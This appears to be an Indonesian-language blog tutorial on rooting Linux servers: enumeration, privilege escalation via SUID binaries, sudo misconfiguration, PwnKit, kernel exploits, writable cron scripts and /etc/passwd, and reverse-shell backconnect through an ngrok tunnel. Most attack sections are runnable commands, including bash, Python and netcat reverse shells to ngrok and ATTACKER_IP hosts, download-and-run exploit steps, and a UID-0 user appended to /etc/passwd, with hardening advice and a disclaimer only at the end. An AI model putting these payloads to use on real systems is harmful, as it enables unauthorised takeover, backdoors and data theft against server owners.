---
title: "Rooting Server: Cara Hacker Naik Level dari User Biasa ke Admin Penuh"
date: 2026-06-26
author: "RavxyTech"
tags: ["privilege-escalation", "root", "linux", "pentesting", "ngrok", "backconnect", "red-team"]
categories: ["Research", "Cybersecurity"]
description: "Penjelasan lengkap tentang apa itu root di server Linux, kenapa hacker mengincar akses root, bagaimana proses privilege escalation bekerja mulai dari enumerasi gcc, pkexec, python, sampai teknik backconnect menggunakan ngrok."
draft: false
---

Belakangan ini timeline lagi rame banget soal peretasan server yang berujung dapet akses root. Berita di sana-sini, forum underground makin ramai, dan banyak yang penasaran sebenernya gimana sih prosesnya sampai seseorang bisa "menguasai" sebuah server secara penuh.

Artikel ini bakal ngebahas tuntas mulai dari apa itu root, bagaimana proses escalation dari user biasa jadi root, sampai teknik backconnect pakai ngrok buat dapetin shell dari balik NAT. Semua dijelasin dari sudut pandang edukasi, intinya siapin kopi + rokok ae wkwkwk.

{{< figure src="/images/rootserver.jpg" >}}

---

## Apa Itu Root di Server Linux?

Di dunia Linux, **root** adalah user dengan level akses paling tinggi. Kalau di Windows istilahnya Administrator, di Linux namanya root. User root punya UID (User ID) bernilai 0, dan ini adalah tanda bahwa user tersebut punya kendali penuh atas seluruh sistem.

Apa yang bisa dilakukan root? Singkatnya, **segalanya**.

```
- Membaca, menulis, dan menghapus file apapun di seluruh sistem
- Menginstall dan menghapus software
- Menambah dan menghapus user lain
- Mengubah konfigurasi sistem, firewall, dan service
- Melihat proses milik semua user
- Mengakses seluruh database yang berjalan di server
- Memodifikasi kernel dan modul sistem
```
Tidak ada batasan, tidak ada permission denied, tidak ada yang bisa menghalangi. Makanya kalau seseorang berhasil mendapatkan akses root di server orang lain tanpa izin, itu sudah termasuk full compromise.

---

## Kenapa Hacker Mengincar Root?

Pertanyaan bagus. Kenapa tidak cukup dengan user biasa saja?

Saat seorang attacker pertama kali masuk ke sebuah server, biasanya yang didapat adalah akses sebagai **user biasa** dengan privilege terbatas. User biasa hanya bisa mengakses file miliknya sendiri, tidak bisa menginstall software, tidak bisa membaca file milik user lain, dan tidak bisa mengubah konfigurasi sistem.

Dengan akses user biasa, attacker bisa melakukan hal-hal terbatas seperti:

```
- Membaca file di home directory sendiri
- Menjalankan command dasar
- Melihat proses milik sendiri
```

Tapi dengan akses root, semuanya berubah total:

```
- Dump seluruh database (MySQL, PostgreSQL, MongoDB, semuanya)
- Baca file /etc/shadow yang berisi hash password semua user
- Install backdoor yang persistent (tetap ada walau server di-reboot)
- Modifikasi log untuk menghapus jejak
- Pivot ke server lain di jaringan internal
- Ambil alih domain, website, email, semuanya
```

Intinya, root itu adalah "game over" buat server tersebut. Tidak ada lagi yang perlu di-bypass, tidak ada lagi restriction yang menghalangi. Makanya privilege escalation dari user biasa ke root itu jadi salah satu tahapan paling krusial dalam proses peretasan.

---

## Tahapan Serangan: Dari Nol Sampai Root

Sebelum masuk ke teknis privilege escalation, penting untuk paham dulu gambaran besar alur sebuah serangan terhadap server. Prosesnya tidak langsung "tiba-tiba jadi root" wkwkwk. Ada tahapan yang dilalui.

### 1. Initial Access (Masuk Pertama Kali)

Ini adalah langkah pertama di mana attacker mendapatkan akses awal ke server. Cara masuknya bisa bermacam-macam:

- **Exploit vulnerability di web application** (SQL Injection, RCE, File Upload, dan lainnya)
- **Kredensial yang bocor** (password default, credential stuffing, atau dari breach database)
- **SSH bruteforce** kalau password lemah
- **Webshell** yang sudah ditanam sebelumnya

Setelah berhasil masuk, biasanya yang didapat adalah shell sebagai user `www-data` (kalau masuknya lewat web), atau user biasa kalau masuknya lewat SSH.

### 2. Enumeration (Mengumpulkan Informasi)

Nah di sinilah fase paling penting dan paling seru wkwkwk. Setelah dapat shell, attacker tidak langsung "nge-root". Yang dilakukan pertama kali adalah **mengumpulkan informasi sebanyak-banyaknya** tentang server tersebut.

Informasi apa yang dicari? Sabar, bakal dibahas detail di section berikutnya.

### 3. Privilege Escalation (Naik Level ke Root)

Berdasarkan informasi yang dikumpulkan di fase enumeration, attacker akan mencari jalur untuk menaikkan privilege dari user biasa menjadi root. Di sinilah gcc, pkexec, python, dan teman-temannya berperan.

### 4. Post-Exploitation (Setelah Jadi Root)

Setelah berhasil jadi root, attacker bisa melakukan apa saja. Mulai dari dump database, install backdoor, sampai menghapus jejak di log. Tapi pembahasan ini di luar scope artikel kali ini, soalnya sensitif lah, cari2 sendiri ae takut aku wkwkwk.

---

## Fase Enumeration: Apa yang Dicari Hacker Setelah Masuk?

Ini bagian yang banyak orang penasaran. Setelah dapat shell di server, apa yang pertama kali dilakukan?

Jawabannya: **enumerasi**. Mengecek apa saja yang tersedia di server, apa yang bisa dimanfaatkan, dan jalur mana yang paling mungkin untuk naik ke root.

### Cek User Saat Ini

```bash
id
whoami
```

Output `id` bakal menunjukkan UID, GID, dan groups dari user saat ini. Kalau UID-nya 0, selamat, sudah root wkwkwk. Tapi biasanya yang keluar adalah sesuatu seperti:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Artinya masih jadi user `www-data` dengan privilege terbatas.

### Cek Informasi Sistem

```bash
uname -a
cat /etc/os-release
cat /proc/version
```

Informasi kernel dan versi OS sangat penting. Kernel yang sudah lawas sering punya vulnerability yang bisa dieksploitasi untuk privilege escalation. Misalnya kernel versi 3.x atau 4.x awal yang sudah ada CVE-nya.

### Cek SUID Binary

```bash
find / -perm -u=s -type f 2>/dev/null
```

Ini salah satu command paling penting dalam enumeration. SUID (Set User ID) binary adalah file executable yang berjalan dengan privilege pemiliknya, bukan privilege user yang menjalankannya. Kalau ada binary SUID yang dimiliki root dan bisa dimanfaatkan, itu bisa jadi jalan menuju root.

Contoh output yang menarik:

```
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/find
/usr/bin/python3
/usr/bin/vim
```

Kalau `pkexec`, `find`, `python3`, atau `vim` punya bit SUID, itu sudah jadi jalur escalation yang sangat potensial.

### Mengapa Hacker Mencari GCC?

```bash
which gcc
gcc --version
```

**GCC** (GNU Compiler Collection) adalah compiler untuk bahasa C. Kenapa ini penting? Karena banyak exploit untuk privilege escalation ditulis dalam bahasa C dan perlu di-compile langsung di server target.

Kalau gcc tersedia di server, attacker bisa:

1. Download source code exploit (misalnya kernel exploit)
2. Compile langsung di server target
3. Jalankan exploit-nya untuk mendapatkan root

Contoh skenario nyata:

```bash
# Download exploit
wget https://example.com/exploit.c -O /tmp/exploit.c

# Compile dengan gcc
gcc /tmp/exploit.c -o /tmp/exploit

# Jalankan
chmod +x /tmp/exploit
/tmp/exploit

# Kalau berhasil:
# root@server:~#
```

Kalau gcc tidak ada, bukan berarti jalan buntu. Tapi prosesnya jadi lebih ribet karena harus cross-compile di mesin lain dan transfer binary-nya ke server target. Makanya attacker selalu senang kalau nemu gcc sudah terinstall wkwkwk.

### Mengapa Hacker Mencari Python?

```bash
which python python3
python --version
python3 --version
```

**Python** dicari karena beberapa alasan:

**Pertama**, Python bisa dipakai untuk spawning proper TTY shell. Shell yang didapat dari exploit web biasanya "jelek" dan terbatas. Dengan Python, shell bisa di-upgrade jadi interactive:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Sebelum command di atas, shell biasanya tidak bisa pakai `sudo`, tidak bisa pakai `su`, tidak ada tab completion, dan kalau tekan Ctrl+C malah mati koneksinya. Setelah spawn PTY, shell jadi jauh lebih fungsional.

**Kedua**, Python bisa dipakai untuk menjalankan exploit yang ditulis dalam Python tanpa perlu compile apapun.

**Ketiga**, kalau Python punya capability khusus atau bit SUID, itu langsung jadi jalur escalation:

```bash
# Kalau python3 punya SUID bit
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Command di atas langsung memberikan shell root kalau Python punya SUID bit. Sesimpel itu.

### Mengapa Hacker Mencari Pkexec?

```bash
which pkexec
pkexec --version
```

**Pkexec** adalah bagian dari PolicyKit yang fungsinya memungkinkan user biasa menjalankan program sebagai user lain (termasuk root) dengan otorisasi tertentu. Kenapa ini jadi incaran?

Karena ada vulnerability legendaris yang dikenal sebagai **PwnKit** (CVE-2021-4034). Vulnerability ini ada di hampir semua distribusi Linux yang menggunakan pkexec, dan eksploitasinya relatif mudah.

```bash
# Cek apakah pkexec vulnerable
pkexec --version
# PolicyKit versi di bawah 0.120 biasanya masih vulnerable
```

Exploit PwnKit bekerja dengan memanfaatkan bug di cara pkexec menangani argc (argument count). Kalau pkexec dipanggil dengan argc = 0 (tanpa argument sama sekali), terjadi out-of-bounds read yang bisa dimanfaatkan untuk menulis environment variable berbahaya yang akhirnya memberikan shell root.

Yang membuat PwnKit sangat populer adalah:

1. **Hampir universal** karena pkexec terinstall default di banyak distro
2. **Tidak perlu konfigurasi khusus** untuk dieksploitasi
3. **Exploit-nya sangat reliable** dengan tingkat keberhasilan yang tinggi
4. **Banyak PoC yang tersedia** dan mudah dijalankan

```bash
# Contoh eksploitasi PwnKit (simplified)
# Download PoC
curl -fsSL https://example.com/pwnkit -o /tmp/pwnkit

# Jalankan
chmod +x /tmp/pwnkit
/tmp/pwnkit

# Output:
# root@server:/tmp#
```

Dari user biasa langsung jadi root dalam hitungan detik. Serem kan wkwkwk.

### Tool Lain yang Dicari

Selain tiga besar di atas (gcc, python, pkexec), berikut beberapa binary dan tool lain yang juga dicari saat enumeration:

```bash
# Perl (alternatif Python untuk spawn shell dan exploit)
which perl

# Wget dan Curl (untuk download exploit)
which wget curl

# Netcat (untuk reverse shell dan transfer file)
which nc ncat netcat

# Sudo (cek apakah user bisa menjalankan command sebagai root)
sudo -l

# Crontab (cek scheduled task yang bisa dimanfaatkan)
cat /etc/crontab
ls -la /etc/cron.*

# Writable directories (tempat menyimpan exploit)
find / -writable -type d 2>/dev/null

# Capabilities (privilege khusus pada binary tertentu)
getcap -r / 2>/dev/null
```

### Automated Enumeration Tools

Buat yang mau otomatis, ada beberapa tool populer yang menjalankan semua pengecekan di atas secara otomatis:

**LinPEAS** adalah yang paling lengkap:

```bash
# Download dan jalankan LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS akan mengecek ratusan vektor privilege escalation dan memberikan output berwarna di mana merah berarti "ini sangat mungkin bisa diexploit". Sangat membantu untuk attacker maupun defender.

**LinEnum** adalah alternatif yang lebih ringkas:

```bash
./LinEnum.sh -t
```

---

## Teknik Privilege Escalation yang Umum

Setelah fase enumeration selesai dan informasi sudah terkumpul, berikut beberapa teknik privilege escalation yang paling sering ditemui di lapangan.

### 1. Kernel Exploit

Kalau kernel-nya sudah tua dan punya CVE yang diketahui, ini adalah jalur paling langsung. Attacker tinggal cari exploit yang sesuai dengan versi kernel, compile (kalau gcc tersedia), dan jalankan.

```bash
# Cek versi kernel
uname -r
# Output: 4.15.0-20-generic

# Cari exploit yang cocok di ExploitDB atau Google
# Download, compile, jalankan
```

Contoh kernel exploit terkenal:
- **DirtyCow** (CVE-2016-5195) untuk kernel 2.x sampai 4.x
- **DirtyPipe** (CVE-2022-0847) untuk kernel 5.8 sampai 5.16
- **GameOver(lay)** (CVE-2023-2640) untuk Ubuntu kernel

### 2. SUID Abuse

Kalau ada binary SUID yang bisa dimanfaatkan, situs [GTFOBins](https://gtfobins.github.io/) adalah referensi lengkap yang menjelaskan cara memanfaatkan setiap binary untuk escalation.

```bash
# Contoh: find dengan SUID
find . -exec /bin/bash -p \; -quit

# Contoh: vim dengan SUID
vim -c ':!/bin/bash'

# Contoh: nmap versi lama dengan SUID
nmap --interactive
!sh
```

### 3. Sudo Misconfiguration

```bash
sudo -l
```

Kalau output menunjukkan bahwa user bisa menjalankan command tertentu sebagai root tanpa password, itu adalah emas murni. Contoh:

```
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/python3
```

Dari situ tinggal manfaatkan:

```bash
# Sudo python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# Sudo vim
sudo vim -c ':!/bin/bash'

# Sudo find
sudo find / -exec /bin/bash \; -quit
```

### 4. Cron Job Exploitation

Kalau ada cron job yang berjalan sebagai root dan file script-nya bisa ditulis oleh user biasa:

```bash
# Cek crontab
cat /etc/crontab

# Misalnya ada entry:
# * * * * * root /opt/scripts/backup.sh

# Cek permission
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ... (writable oleh siapa saja!)

# Tambahkan reverse shell ke script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Tunggu cron jalan, dapat shell root
```

### 5. Writable /etc/passwd

Di beberapa server yang misconfigured, file `/etc/passwd` bisa ditulis oleh user biasa. Kalau itu terjadi, tinggal tambahkan user baru dengan UID 0:

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Tambahkan ke /etc/passwd
echo 'hacker:$1$xyz$hash_disini:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login sebagai user baru
su hacker
# Password: password123
# root@server:#
```

---

## Backconnect dengan Ngrok

Nah ini bagian yang juga banyak ditanyakan. Apa itu backconnect dan kenapa pakai ngrok?

### Masalah: NAT dan Firewall

Dalam banyak skenario, mesin attacker berada di belakang **NAT** (Network Address Translation). Artinya mesin attacker tidak punya IP publik yang bisa dijangkau langsung dari internet. Ini adalah masalah klasik untuk reverse shell karena server target perlu mengirimkan koneksi balik ke mesin attacker, tapi tidak bisa menjangkaunya karena terhalang NAT.

Ilustrasinya begini:

```
[Server Target]  ---koneksi balik--->  [NAT/Router]  --->  [Mesin Attacker]
                                           ^
                                           |
                                    Koneksi diblok!
                                    IP private tidak
                                    bisa dijangkau
                                    dari luar
```

### Solusi: Ngrok sebagai Tunnel

**Ngrok** adalah layanan tunneling yang membuat tunnel dari internet publik ke mesin lokal. Dengan ngrok, mesin yang berada di belakang NAT bisa "terexpose" ke internet melalui subdomain ngrok.

```
[Server Target]  --->  [Ngrok Cloud]  --->  [Tunnel]  --->  [Mesin Attacker]
                                                              (di belakang NAT)
```

Jadi meskipun mesin attacker tidak punya IP publik, server target bisa mengirimkan koneksi balik melalui alamat yang disediakan ngrok.

### Langkah-Langkah Backconnect dengan Ngrok

**Step 1: Install dan Setup Ngrok**

```bash
# Download ngrok (di mesin attacker)
# Bisa dari https://ngrok.com/download

# Autentikasi (perlu akun ngrok, gratis)
ngrok config add-authtoken TOKEN_DARI_DASHBOARD_NGROK
```

**Step 2: Buat TCP Tunnel**

```bash
# Buka tunnel TCP di port 4444
ngrok tcp 4444
```

Output ngrok akan menampilkan sesuatu seperti:

```
Session Status    online
Forwarding        tcp://0.tcp.ngrok.io:12345 -> localhost:4444
```

Catat alamat `0.tcp.ngrok.io` dan port `12345`. Ini yang akan dipakai di payload reverse shell.

**Step 3: Siapkan Listener**

Di terminal lain (masih di mesin attacker), jalankan netcat sebagai listener:

```bash
nc -lvnp 4444
```

Listener ini menunggu koneksi masuk di port 4444, yang merupakan port lokal yang sudah di-tunnel oleh ngrok.

**Step 4: Eksekusi Reverse Shell di Server Target**

Di server target, jalankan payload reverse shell yang mengarah ke alamat ngrok (bukan ke IP attacker langsung):

```bash
# Bash reverse shell via ngrok
bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1
```

Atau kalau pakai Python:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.ngrok.io",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

Atau pakai Netcat:

```bash
nc 0.tcp.ngrok.io 12345 -e /bin/bash
```

**Step 5: Terima Koneksi**

Kalau semua berjalan lancar, di terminal listener (nc -lvnp 4444) akan muncul shell dari server target:

```
Connection received!
www-data@target-server:/$
```

Sekarang sudah punya shell di server target, meskipun mesin attacker berada di belakang NAT wkwkwkwkwk.

### Alur Lengkap Backconnect via Ngrok

```
1. Attacker jalankan: ngrok tcp 4444
   -> Dapat alamat: 0.tcp.ngrok.io:12345

2. Attacker jalankan: nc -lvnp 4444
   -> Listener siap menerima koneksi

3. Di server target, jalankan reverse shell ke 0.tcp.ngrok.io:12345
   -> Koneksi keluar dari server target

4. Koneksi masuk ke ngrok cloud
   -> Ngrok forward ke localhost:4444 milik attacker

5. Listener nc menerima koneksi
   -> Shell didapat!

6. Attacker upgrade shell:
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   -> Interactive shell siap digunakan
```

### Kenapa Ngrok Populer untuk Backconnect?

1. **Gratis** untuk penggunaan dasar (cukup untuk satu tunnel TCP)
2. **Tidak perlu IP publik** karena ngrok yang menyediakan
3. **Tidak perlu konfigurasi router** atau port forwarding
4. **Setup cepat** dan bisa langsung dipakai dalam hitungan menit
5. **Cross-platform** karena tersedia untuk Windows, Linux, dan macOS

### Alternatif Ngrok

Selain ngrok, ada beberapa alternatif lain yang sering dipakai:

| Tool | Kelebihan | Kekurangan |
|------|-----------|------------|
| **Ngrok** | Mudah, cepat, populer | Gratis terbatas 1 tunnel |
| **Serveo** | Gratis, tanpa install | Kadang down |
| **Localtunnel** | Open source | Kurang stabil |
| **Bore** | Self-hosted, ringan | Perlu setup server sendiri |
| **Chisel** | TCP tunnel, open source | Perlu binary di kedua sisi |

---

## Bagaimana Cara Melindungi Server?

Setelah paham bagaimana serangan bekerja, sekarang saatnya bahas pertahanan. Karena ilmu security itu dua arah, paham menyerang supaya lebih paham cara bertahan.

### 1. Update dan Patch Secara Rutin

```bash
# Untuk Debian/Ubuntu
apt update && apt upgrade -y

# Untuk RHEL/CentOS
yum update -y
```

Kernel exploit dan PwnKit hanya bekerja di versi yang belum dipatch. Rajin update adalah pertahanan paling dasar tapi paling efektif.

### 2. Audit SUID Binary

```bash
# Cari semua SUID binary
find / -perm -u=s -type f 2>/dev/null

# Hapus SUID bit dari binary yang tidak perlu
chmod u-s /path/to/unnecessary/binary
```

### 3. Konfigurasi Sudo dengan Benar

Jangan pernah memberikan NOPASSWD untuk binary yang bisa spawn shell. Selalu gunakan prinsip least privilege.

### 4. Hapus Tools yang Tidak Diperlukan

```bash
# Kalau server tidak perlu gcc
apt remove gcc

# Kalau server tidak perlu netcat
apt remove netcat
```

Server produksi idealnya tidak memiliki compiler atau debugging tools yang terinstall. Semakin sedikit tools yang tersedia, semakin sulit bagi attacker untuk melakukan escalation.

### 5. Monitor Koneksi Keluar

Reverse shell dan backconnect ngrok bergantung pada koneksi keluar dari server. Firewall yang membatasi outbound connection bisa mencegah teknik ini:

```bash
# Contoh iptables: hanya izinkan koneksi keluar ke port 80 dan 443
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -j DROP
```

### 6. Gunakan SELinux atau AppArmor

Security module seperti SELinux dan AppArmor menambahkan lapisan proteksi tambahan yang membatasi apa yang bisa dilakukan oleh setiap proses, bahkan oleh root sekalipun.

---

## Ringkasan

Jadi kalau dirangkum secara sederhana, alur dari "masuk server" sampai "jadi root" itu kira-kira begini:

```
Initial Access (masuk lewat vulnerability/credential)
    ↓
Enumeration (cek gcc, python, pkexec, SUID, kernel, sudo)
    ↓
Privilege Escalation (exploit kernel, SUID abuse, PwnKit, sudo misconfig)
    ↓
Root Access (uid=0, full control)
```

Dan untuk backconnect:

```
Attacker di belakang NAT
    ↓
Pakai ngrok untuk buat tunnel TCP
    ↓
Jalankan reverse shell di target mengarah ke alamat ngrok
    ↓
Koneksi di-forward ke mesin attacker
    ↓
Shell didapat
```

Semuanya saling terhubung dan membentuk satu rangkaian serangan yang utuh. Pahami prosesnya, dan pertahanan bisa dibangun dengan lebih baik. Karena pada akhirnya, memahami cara kerja serangan adalah langkah pertama untuk bisa mencegahnya.

---

> **Disclaimer**
>
> Seluruh materi dalam artikel ini dibuat **murni untuk tujuan edukasi dan keamanan informasi**. Teknik yang dijelaskan hanya boleh dipraktikkan pada sistem milik sendiri, lingkungan lab yang sudah disiapkan untuk pengujian, jangan sikat web orang juga wkwkwk.
>
> **Jangan pernah menjalankan teknik ini ke sistem yang bukan milik sendiri atau yang tidak memiliki izin eksplisit untuk diuji.** Mengeksploitasi sistem tanpa izin adalah tindakan ilegal dan bisa dikenai sanksi hukum.
>
> [ravxytech.site](https://ravxytech.site) hadir untuk berbagi pengetahuan seputar teknologi dan cyber security secara bertanggung jawab.
